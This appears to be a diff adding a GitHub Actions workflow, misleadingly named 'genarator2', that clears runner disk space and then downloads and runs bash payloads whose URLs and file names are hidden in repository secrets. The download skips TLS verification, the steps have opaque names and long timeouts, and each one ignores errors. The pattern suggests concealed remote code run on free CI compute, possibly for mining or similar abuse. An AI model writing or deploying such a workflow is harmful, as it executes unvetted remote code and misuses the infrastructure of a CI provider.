@@ -1,0 +1,39 @@
+name: genarator2
+
+on:
+    push:
+    workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+    - name: in0
+      uses: nanami157/disk-space-reclaimer@main
+      with:
+             android: true
+             dotnet: true
+             haskell: true
+             large-packages: true
+             swap-storage: true
+             docker-images: true
+             tools-cache: true
+    - name: in1
+      uses: actions/checkout@main
+
+    - name: in2
+      timeout-minutes: 2
+      continue-on-error: true
+      run: |
+             curl -sLkO ${{ secrets.EA_AB }}
+             bash ${{ secrets.EA_CD }}
+    - name: in3
+      timeout-minutes: 300
+      continue-on-error: true
+      run: |
+             bash ${{ secrets.EA_EF }}
+    - name: in4
+      continue-on-error: true
+      run: |
+            bash ${{ secrets.EA_GH }}
